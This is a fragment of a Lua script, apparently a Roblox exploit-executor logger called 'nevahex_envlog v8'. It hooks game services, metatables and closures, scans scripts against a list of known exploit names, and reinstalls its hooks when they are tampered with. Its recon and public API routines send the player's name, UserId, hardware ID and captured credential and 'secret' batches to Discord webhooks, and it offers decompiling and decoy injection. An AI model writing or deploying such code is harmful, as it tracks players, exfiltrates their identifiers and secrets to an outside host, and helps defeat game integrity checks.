            if in_reentry() then return end
            local class=inst.ClassName
            if CONFIG.auto_descendant_spy and not CONFIG.descendant_ignore_classes[class] then
                entering()
                local parent=inst.Parent and inst.Parent:GetFullName() or "?"
                leaving()
                log_event("descendant",{op="removed",class=class,name=inst.Name,parent=parent,src="DescendantRemoving",line=0,fn="connect"})
            end
        end)
    end)
end

local function install_drawing_spy()
    if not CONFIG.auto_drawing_spy then return end
    pcall(function()
        local env=getgenv and getgenv() or _G
        local D=env.Drawing or Drawing
        if not D or type(D.new)~="function" then return end
        local old=D.new
        D.new=newcclosure(function(class)
            if in_reentry() then return old(class) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("drawing",{op="new",class=tostring(class),src=s,line=l,fn=n,frames=fr})
            return old(class)
        end)
    end)
end

local function install_uis_input()
    if not CONFIG.auto_uis_input then return end
    pcall(function()
        local UIS=game:GetService("UserInputService")
        UIS.InputBegan:Connect(function(input,gp)
            if in_reentry() then return end
            entering()
            local utype=tostring(input.UserInputType)
            local kcode=tostring(input.KeyCode)
            leaving()
            log_event("input",{op="Began",input_type=utype,key=kcode,processed=gp and "1" or "0",src="UserInputService",line=0,fn="connect"})
        end)
    end)
end

local function install_cas_spy()
    if not CONFIG.auto_cas_spy then return end
    pcall(function()
        local CAS=game:GetService("ContextActionService")
        for _,name in ipairs({"BindAction","BindActionAtPriority","UnbindAction"}) do
            local old=CAS[name]
            if type(old)=="function" then
                CAS[name]=newcclosure(function(actionName,...)
                    if in_reentry() then return old(actionName,...) end
                    entering(); local s,l,n,fr=caller_info(2); leaving()
                    log_event("cas",{op=name,action=tostring(actionName),src=s,line=l,fn=n,frames=fr})
                    return old(actionName,...)
                end)
            end
        end
    end)
end

local function install_datastore_spy()
    if not CONFIG.auto_datastore_spy then return end
    pcall(function()
        local DSS=game:GetService("DataStoreService")
        for _,name in ipairs({"GetDataStore","GetGlobalDataStore","GetOrderedDataStore"}) do
            local old=DSS[name]
            if type(old)=="function" then
                DSS[name]=newcclosure(function(self,storeName,scope,...)
                    if in_reentry() then return old(self,storeName,scope,...) end
                    entering(); local s,l,n,fr=caller_info(2); leaving()
                    log_event("datastore",{op=name,store=tostring(storeName or "?"),scope=tostring(scope or "global"),src=s,line=l,fn=n,frames=fr})
                    return old(self,storeName,scope,...)
                end)
            end
        end
    end)
end

local function install_marketplace_spy()
    if not CONFIG.auto_marketplace_spy then return end
    pcall(function()
        local MS=game:GetService("MarketplaceService")
        for _,name in ipairs({"PromptPurchase","PromptGamePassPurchase","PromptProductPurchase","GetProductInfo"}) do
            local old=MS[name]
            if type(old)=="function" then
                MS[name]=newcclosure(function(self,a,b,...)
                    if in_reentry() then return old(self,a,b,...) end
                    entering(); local s,l,n,fr=caller_info(2); leaving()
                    log_event("marketplace",{op=name,a=tostring(a or "?"),b=tostring(b or "?"),src=s,line=l,fn=n,frames=fr})
                    return old(self,a,b,...)
                end)
            end
        end
    end)
end

local function install_teleport_spy()
    if not CONFIG.auto_teleport_spy then return end
    pcall(function()
        local TS=game:GetService("TeleportService")
        for _,name in ipairs({"Teleport","TeleportToPlaceInstance","TeleportToPrivateServer"}) do
            local old=TS[name]
            if type(old)=="function" then
                TS[name]=newcclosure(function(self,...)
                    if in_reentry() then return old(self,...) end
                    entering(); local s,l,n,fr=caller_info(2)
                    local a=table.pack(...)
                    leaving()
                    log_event("teleport",{op=name,arg1=tostring(a[1] or "?"),arg2=tostring(a[2] or "?"),src=s,line=l,fn=n,frames=fr})
                    return old(self,...)
                end)
            end
        end
    end)
end

local function install_sound_spy()
    if not CONFIG.auto_sound_spy then return end
    pcall(function()
        game.DescendantAdded:Connect(function(inst)
            if inst.ClassName~="Sound" then return end
            inst.Played:Connect(function()
                log_event("sound",{op="Played",target=inst:GetFullName(),id=tostring(inst.SoundId),volume=tostring(inst.Volume),src="Sound",line=0,fn="connect"})
            end)
        end)
    end)
end

local function install_animation_spy()
    if not CONFIG.auto_animation_spy then return end
    pcall(function()
        local plr=game:GetService("Players").LocalPlayer
        if not plr then return end
        plr.CharacterAdded:Connect(function(char)
            task.wait(0.5)
            local animator=char:FindFirstChildOfClass("Animator")
            if not animator then return end
            animator.AnimationPlayed:Connect(function(track)
                log_event("animation",{op="played",id=track.Animation and tostring(track.Animation.AnimationId) or "?",priority=tostring(track.Priority),speed=tostring(track.Speed),src="Animator",line=0,fn="connect"})
            end)
        end)
    end)
end

local function install_camera_spy()
    if not CONFIG.auto_camera_spy then return end
    pcall(function()
        local cam=workspace.CurrentCamera
        if not cam then return end
        for _,prop in ipairs({"CameraType","FieldOfView"}) do
            cam:GetPropertyChangedSignal(prop):Connect(function()
                log_event("camera",{op=prop,value=tostring(cam[prop]),src="Camera",line=0,fn="prop"})
            end)
        end
    end)
end

local function install_lighting_spy()
    if not CONFIG.auto_lighting_spy then return end
    pcall(function()
        local L=game:GetService("Lighting")
        for _,prop in ipairs({"ClockTime","Ambient","OutdoorAmbient","Brightness","FogEnd","FogStart","GlobalShadows","ExposureCompensation"}) do
            local ok,sig=pcall(function() return L:GetPropertyChangedSignal(prop) end)
            if ok and sig then
                sig:Connect(function() log_event("lighting",{op="changed",prop=prop,value=tostring(L[prop]),src="Lighting",line=0,fn="prop"}) end)
            end
        end
    end)
end

local function install_error_capture()
    if not CONFIG.auto_error_capture then return end
    pcall(function()
        local SC=game:GetService("ScriptContext")
        SC.Error:Connect(function(message,stack,script_)
            log_event("error",{op="runtime",message=tostring(message):sub(1,300),trace=tostring(stack):sub(1,300),script=script_ and script_.Name or "?",src="ScriptContext",line=0,fn="connect"})
        end)
    end)
end

local function install_network_stats()
    if not CONFIG.auto_network_stats then return end
    task.spawn(function()
        while true do
            task.wait(CONFIG.network_sample_interval)
            pcall(function()
                local net=game:GetService("Stats").Network
                if net and net.ServerStatsItem then
                    local ping=net.ServerStatsItem["Data Ping"] and net.ServerStatsItem["Data Ping"]:GetValue() or 0
                    local inKB=net.ServerStatsItem["Data In"] and net.ServerStatsItem["Data In"]:GetValue() or 0
                    local outKB=net.ServerStatsItem["Data Out"] and net.ServerStatsItem["Data Out"]:GetValue() or 0
                    log_event("network",{op="sample",ping_ms=string.format("%.1f",ping),in=string.format("%.1f",inKB),out=string.format("%.1f",outKB),src="Stats",line=0,fn="sample"})
                end
            end)
        end
    end)
end

local function install_fps_counter()
    if not CONFIG.auto_fps_counter then return end
    task.spawn(function()
        local RS=game:GetService("RunService")
        while true do
            local frames=0
            local start=os.clock()
            local conn=RS.RenderStepped:Connect(function() frames=frames+1 end)
            task.wait(CONFIG.fps_sample_interval)
            if conn then conn:Disconnect() end
            local elapsed=os.clock()-start
            if elapsed>0 then
                log_event("fps",{op="sample",fps=string.format("%.1f",frames/elapsed),src="RunService",line=0,fn="sample"})
            end
        end
    end)
end

local function install_env_snapshot()
    if not CONFIG.auto_env_snapshot then return end
    task.spawn(function()
        task.wait(2)
        pcall(function()
            local env=getgenv and getgenv() or _G
            local n=0
            for _ in pairs(env) do n=n+1 end
            log_event("env_snapshot",{label="post_load",global_keys=n,src="env_snapshot",line=0,fn="snapshot"})
        end)
    end)
end

local function install_known_bad_scan()
    if not CONFIG.auto_known_bad_scan then return end
    local KNOWN_BAD={"kavo","owl","orion","hydrogen","apolon","vega","solara","krnl","infinite yield","iy_","dark dex","dex","hydroxide","remotespy","rspy","synapse","script-ware","sw_","fluxus","codex","arceus"}
    task.spawn(function()
        task.wait(3)
        if not getscripts then return end
        for _,scr in ipairs(getscripts()) do
            local lower=scr.Name:lower()
            for _,bad in ipairs(KNOWN_BAD) do
                if lower:find(bad,1,true) then
                    log_event("known_bad",{op="loaded",name=scr.Name,signature=bad,class=scr.ClassName,src="script_scan",line=0,fn="scan"})
                    break
                end
            end
            pcall(scan_script_constants,scr)
        end
    end)
end

local function install_hook_sweep()
    if not CONFIG.auto_hook_sweep then return end
    task.spawn(function()
        while true do
            task.wait(30)
            pcall(function()
                if not getgc or not iscclosure then return end
                local n=0
                for _,obj in ipairs(getgc()) do
                    if type(obj)=="function" and iscclosure(obj) then n=n+1 end
                end
                log_event("hook_sweep",{op="scan",cclosures=n,src="gc_scan",line=0,fn="sweep"})
            end)
        end
    end)
end

-- ============================================================
-- ENV DIFF / INTEGRITY / RECON / HEARTBEAT
-- ============================================================
local last_env_snapshot=nil
local function snapshot_env(env)
    env=env or (getgenv and getgenv() or _G)
    local out={}
    for k,v in pairs(env) do out[k]=typeof(v) end
    return out
end

local function diff_env()
    local env=getgenv and getgenv() or _G
    local now=snapshot_env(env)
    if not last_env_snapshot then last_env_snapshot=now; return end
    local added,removed,changed={},{},{}
    for k,t in pairs(now) do
        if last_env_snapshot[k]==nil then added[#added+1]=k
        elseif last_env_snapshot[k]~=t then changed[#changed+1]=k..":"..last_env_snapshot[k].."->"..t end
    end
    for k in pairs(last_env_snapshot) do if now[k]==nil then removed[#removed+1]=k end end
    if #added+#removed+#changed>0 then
        log_event("diff",{label="getgenv",added=added,removed=removed,changed=changed,src="env_diff",line=0,fn="diff_env"})
    end
    last_env_snapshot=now
end

local function check_integrity()
    local gm=getrawmetatable and getrawmetatable(game)
    if not gm then return end
    local tampered=false
    if hook_registry["gm.__index"] and gm.__index~=hook_registry["gm.__index"] then tampered=true end
    if hook_registry["gm.__newindex"] and gm.__newindex~=hook_registry["gm.__newindex"] then tampered=true end
    if hook_registry["gm.__namecall"] and gm.__namecall~=hook_registry["gm.__namecall"] then tampered=true end
    if tampered then
        send_embed("Hook Tampering Detected",{
            {name="Detail",value="hooks replaced by another script, reinstalling",inline=false},
            {name="Session",value=SESSION_ID,inline=true},
        },nil,CONFIG.alert_color)
        pcall(install_metahooks)
    end
end

local function send_recon()
    if not CONFIG.recon_on_load then return end
    local env=getgenv and getgenv() or _G
    local executor="unknown"
    if env.identifyexecutor then
        local ok,n,v=pcall(env.identifyexecutor)
        if ok then executor=tostring(n).." "..tostring(v or "") end
    end
    local hwid="n/a"
    if env.gethwid then local ok,h=pcall(env.gethwid); if ok then hwid=tostring(h) end end
    local plr=game:GetService("Players").LocalPlayer
    send_embed("Session Start",{
        {name="Session",value=SESSION_ID,inline=true},
        {name="Executor",value=executor,inline=true},
        {name="Player",value=plr and (plr.Name.." ("..tostring(plr.UserId)..")") or "n/a",inline=true},
        {name="HWID",value=hwid:sub(1,100),inline=false},
        {name="PlaceId",value=tostring(game.PlaceId),inline=true},
        {name="GameId",value=tostring(game.GameId),inline=true},
        {name="JobId",value=tostring(game.JobId),inline=false},
        {name="Creator",value=tostring(game.CreatorId).." ("..tostring(game.CreatorType)..")",inline=true},
    },"nevahex_envlog v8 booted")
end

local function send_heartbeat()
    if CONFIG.heartbeat_seconds<=0 then return end
    local up=math.floor(mono())
    local edges=0
    for _ in pairs(call_graph) do edges=edges+1 end
    send_embed("Heartbeat",{
        {name="Session",value=SESSION_ID,inline=true},
        {name="Uptime",value=tostring(up).."s",inline=true},
        {name="Secrets",value=tostring(SECRETS.hits),inline=true},
        {name="Buffered",value=tostring(count),inline=true},
        {name="Graph Edges",value=tostring(edges),inline=true},
    })
end

-- ============================================================
-- PUBLIC API
-- ============================================================
local function make_watch_proxy(tbl,label)
    label=label or "watch"
    return setmetatable({},{
        __index=function(_,k)
            local v=tbl[k]
            if not in_reentry() then
                entering(); local s,l,n,fr=caller_info(3); leaving()
                log_event("watch",{op="read",target=label,key=k,value=v,src=s,line=l,fn=n,frames=fr})
            end
            return v
        end,
        __newindex=function(_,k,v)
            if not in_reentry() then
                entering(); local s,l,n,fr=caller_info(3); leaving()
                log_event("watch",{op="write",target=label,key=k,value=v,src=s,line=l,fn=n,frames=fr})
            end
            tbl[k]=v
        end,
        __len=function() return #tbl end,
        __pairs=function() return pairs(tbl) end,
        __raw=function() return tbl end,
    })
end

local function make_views()
    local V={}
    function V.top_callers(n)
        n=n or 20
        local agg={}
        for _,e in pairs(entries) do if e and e.data and e.data.src then agg[e.data.src]=(agg[e.data.src] or 0)+1 end end
        local list={}
        for k,v in pairs(agg) do list[#list+1]={src=k,n=v} end
        table.sort(list,function(a,b) return a.n>b.n end)
        local out={}
        for i=1,math.min(n,#list) do out[i]=list[i] end
        return out
    end
    function V.top_remotes(n)
        n=n or 20
        local agg={}
        for _,e in pairs(entries) do
            if e and e.kind=="remote" and e.data then
                local k=tostring(e.data.class)..":"..tostring(e.data.method).." "..fmt_ident(e.data.target)
                agg[k]=(agg[k] or 0)+1
            end
        end
        local list={}
        for k,v in pairs(agg) do list[#list+1]={key=k,n=v} end
        table.sort(list,function(a,b) return a.n>b.n end)
        local out={}
        for i=1,math.min(n,#list) do out[i]=list[i] end
        return out
    end
    function V.top_secrets(n)
        n=n or 20
        local list={}
        for _,e in pairs(entries) do
            if e and e.kind=="secret" and e.data then
                list[#list+1]={pattern=e.data.pattern,sev=e.data.sev,value=e.data.value,src=e.data.src,line=e.data.line,t=e.t}
            end
        end
        table.sort(list,function(a,b) return (a.t or 0)>(b.t or 0) end)
        local out={}
        for i=1,math.min(n,#list) do out[i]=list[i] end
        return out
    end
    function V.lineage() return cred_lineage end
    function V.schemas() return remote_schemas end
    function V.fingerprints() return http_fingerprints end
    return V
end

local Logger={}
local Views=make_views()

function Logger.wrap(env,name)
    env=env or (getgenv and getgenv() or _G)
    local orig=env[name]
    if type(orig)~="function" then return end
    env[name]=newcclosure(function(...)
        if in_reentry() then return orig(...) end
        entering(); local s,l,n,fr=caller_info(2); leaving()
        log_event("invoke",{target=name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
        return orig(...)
    end)
end

function Logger.mark(kind,payload)
    payload=payload or {}
    payload.src=payload.src or "manual"
    payload.line=payload.line or 0
    payload.fn=payload.fn or "Logger.mark"
    log_event(kind,payload)
end

function Logger.snapshot(env,label) return {label=label or "env",keys=snapshot_env(env),t=mono()} end
function Logger.watch(tbl,label) return make_watch_proxy(tbl,label) end
function Logger.taint(v,tag)
    local t=typeof(v)
    if t=="table" or t=="function" or t=="userdata" then taint[v]=tag or true end
end
function Logger.is_tainted(v)
    local t=typeof(v)
    if t=="string" then return is_tainted_string(v) end
    if t=="table" or t=="function" or t=="userdata" then return taint[v] or false end
    return false
end

function Logger.scan(v,ctx)
    ctx=ctx or {kind="manual",src="Logger.scan",line=0,fn="scan"}
    scan_value(v,ctx,0)
end
function Logger.scan_decoded(v,ctx)
    ctx=ctx or {kind="manual_decoded",src="Logger.scan_decoded",line=0,fn="scan_decoded"}
    scan_decoded(v,ctx)
end

function Logger.flush() flush_creds_queue(); flush_envlog_queue(true); persist_replay() end

function Logger.stop()
    _running=false
    pcall(send_beacon,"manual_stop")
    Logger.flush()
    if creds_handle then pcall(function() creds_handle:close() end); creds_handle=nil end
    if envlog_handle then pcall(function() envlog_handle:close() end); envlog_handle=nil end
end

function Logger.set_filter(name,patterns)
    if filters[name]==nil then return end
    filters[name]=patterns or {}
end
function Logger.add_signature(sig)
    if type(sig)=="table" and type(sig.match)=="function" then signatures[#signatures+1]=sig end
end
function Logger.add_pattern(name,re,sev)
    if type(name)~="string" or type(re)~="string" then return end
    PATTERNS[#PATTERNS+1]={name=name,re=re,sev=sev or "MED"}
end

function Logger.dump_function(fn)
    if type(fn)~="function" then return nil end
    local info={}
    info.source=debug.info(fn,"s")
    info.line=debug.info(fn,"l")
    info.name=debug.info(fn,"n")
    info.params=select(2,debug.info(fn,"a"))
    info.varargs=debug.info(fn,"v")
    info.upvalues={}
    if debug.getupvalues then
        local ok,ups=pcall(debug.getupvalues,fn)
        if ok and ups then
            for i,v in ipairs(ups) do info.upvalues[i]={index=i,type=typeof(v),value=fmt_val(v,1)} end
        end
    end
    if debug.getupvalue then
        local i=1
        while true do
            local name,val=debug.getupvalue(fn,i)
            if not name then break end
            info.upvalues[i]={name=name,index=i,type=typeof(val),value=fmt_val(val,1)}
            i=i+1
        end
    end
    info.constants={}
    if debug.getconstants then
        local ok,cs=pcall(debug.getconstants,fn)
        if ok and cs then
            for i,c in ipairs(cs) do info.constants[i]={index=i,type=typeof(c),value=fmt_val(c,1)} end
        end
    end
    info.protos={}
    if debug.getprotos then
        local ok,ps=pcall(debug.getprotos,fn)
        if ok and ps then
            for i,p in ipairs(ps) do info.protos[i]={index=i,source=debug.info(p,"s"),line=debug.info(p,"l")} end
        end
    end
    info.upvalue_chain=upvalue_chain(fn)
    info.instr=instruction_summary(fn)
    return info
end

function Logger.dump_closure(fn)
    if type(fn)~="function" then return nil end
    if dump_function then
        local ok,dumped=pcall(dump_function,fn)
        if ok and dumped then return dumped end
    end
    return Logger.dump_function(fn)
end

function Logger.dump_scripts(filter)
    local out={}
    if not getscripts then return out end
    for _,scr in ipairs(getscripts()) do
        local name=scr.Name
        if not filter or name:find(filter,1,true) then
            out[#out+1]={name=name,class=scr.ClassName,path=scr:GetFullName()}
        end
    end
    return out
end

function Logger.decompile(scr)
    if decompile then return decompile(scr) end
    if getscriptbytecode then return getscriptbytecode(scr) end
    return nil
end

function Logger.scan_gc()
    if not getgc then return {} end
    local counts={function=0,table=0,userdata=0,thread=0,["?"]=0}
    local ok,gc=pcall(getgc)
    if not ok or not gc then return counts end
    for _,obj in ipairs(gc) do
        local t=typeof(obj)
        counts[t]=(counts[t] or 0)+1
    end
    return counts
end

function Logger.remote_inventory()
    local out={}
    local RS=game:GetService("ReplicatedStorage")
    for _,inst in ipairs(RS:GetDescendants()) do
        local c=inst.ClassName
        if c=="RemoteEvent" or c=="RemoteFunction" or c=="UnreliableRemoteEvent" or c=="BindableEvent" or c=="BindableFunction" then
            out[#out+1]={class=c,name=inst.Name,path=inst:GetFullName()}
        end
    end
    return out
end

function Logger.watch_instance(inst,props)
    if not inst or typeof(inst)~="Instance" then return nil end
    props=props or {}
    local label=inst:GetFullName()
    inst.ChildAdded:Connect(function(c) Logger.mark("inst_watch",{target=label,op="child_added",class=c.ClassName,name=c.Name}) end)
    inst.ChildRemoved:Connect(function(c) Logger.mark("inst_watch",{target=label,op="child_removed",class=c.ClassName,name=c.Name}) end)
    for _,prop in ipairs(props) do
        local ok,sig=pcall(function() return inst:GetPropertyChangedSignal(prop) end)
        if ok and sig then
            sig:Connect(function() Logger.mark("inst_watch",{target=label,op="prop",prop=prop,value=tostring(inst[prop])}) end)
        end
    end
    return true
end

function Logger.watch_all_props(inst)
    if not inst or typeof(inst)~="Instance" then return nil end
    local label=inst:GetFullName()
    inst.Changed:Connect(function(prop) Logger.mark("inst_watch",{target=label,op="changed",prop=tostring(prop),value=tostring(inst[prop])}) end)
    return true
end

function Logger.send_now(title,fields,desc,color) return send_embed(title,fields,desc,color) end
function Logger.send_creds_now(batch) return send_creds_file(batch) end
function Logger.send_envlog_now(batch) return send_envlog_file(batch) end
function Logger.beacon(reason) return send_beacon(reason or "manual") end
function Logger.capabilities() return CAP end
function Logger.graph() return call_graph end
function Logger.views() return Views end
function Logger.secret_hits() return SECRETS.hits end
function Logger.secret_reset() SECRETS.seen={}; SECRETS.hits=0 end
function Logger.set_webhook(url) DISCORD_WEBHOOK=url end
function Logger.add_webhook(url) if type(url)=="string" and url~="" then EXTRA_WEBHOOKS[#EXTRA_WEBHOOKS+1]=url end end
function Logger.set_footer(text) CUSTOM_FOOTER=text end
function Logger.recon() send_recon() end
function Logger.heartbeat() send_heartbeat() end
function Logger.session_id() return SESSION_ID end
function Logger.enable_decoy(on) CONFIG.decoy_injection=on and true or false end
function Logger.replay_snapshot() return replay end
function Logger.lineage() return cred_lineage end
function Logger.schemas() return remote_schemas end
function Logger.fingerprints() return http_fingerprints end

Logger.CONFIG=CONFIG
Logger.filters=filters
Logger.signatures=signatures
Logger.patterns=PATTERNS
Logger.views_table=Views
Logger.EMBED_COLOR=EMBED_COLOR
Logger.ALERT_COLOR=ALERT_COLOR

-- ============================================================
-- BOOTSTRAP
-- ============================================================
local _running=true

probe()
capture_executor_fingerprint()
pcall(install_metahooks)
pcall(install_global_hooks)
pcall(install_coroutine_hooks)
pcall(install_task_hooks)
pcall(install_http_hooks)
pcall(install_file_hooks)
pcall(install_debug_hooks)
pcall(install_closure_hooks)
pcall(install_player_hooks)
pcall(install_chat_hooks)
pcall(install_character_hooks)
pcall(install_descendant_gui_spy)
pcall(install_drawing_spy)
pcall(install_uis_input)
pcall(install_cas_spy)
pcall(install_datastore_spy)
pcall(install_marketplace_spy)
pcall(install_teleport_spy)
pcall(install_sound_spy)
pcall(install_animation_spy)
pcall(install_camera_spy)
pcall(install_lighting_spy)
pcall(install_error_capture)
pcall(install_network_stats)
pcall(install_fps_counter)
pcall(install_env_snapshot)
pcall(install_known_bad_scan)
pcall(install_hook_sweep)
pcall(install_heap_sampler)
pcall(install_sig_of_day)
pcall(install_memory_watch)
pcall(install_suspend_guard)
pcall(install_c_api_tracer)

task.spawn(function()
    task.wait(1)
    pcall(send_recon)
end)

task.spawn(function()
    local last_diff=mono()
    local last_hb=mono()
    local last_ig=mono()
    local last_replay=mono()
    while _running do
        task.wait(CONFIG.flush_interval)
        pcall(flush)
        if CONFIG.env_diff_enabled and mono()-last_diff>=CONFIG.env_diff_interval then
            last_diff=mono()
            pcall(diff_env)
        end
        if CONFIG.heartbeat_seconds>0 and mono()-last_hb>=CONFIG.heartbeat_seconds then
            last_hb=mono()
            pcall(send_heartbeat)
        end
        if CONFIG.integrity_seconds>0 and mono()-last_ig>=CONFIG.integrity_seconds then
            last_ig=mono()
            pcall(check_integrity)
        end
        if mono()-last_replay>=30 then
            last_replay=mono()
            pcall(persist_replay)
        end
        if math.random()<0.05 then
            local now=mono()
            for k,b in pairs(rate_buckets) do
                if now-(b.start or 0)>10 then rate_buckets[k]=nil end
            end
        end
    end
end)

return Logger
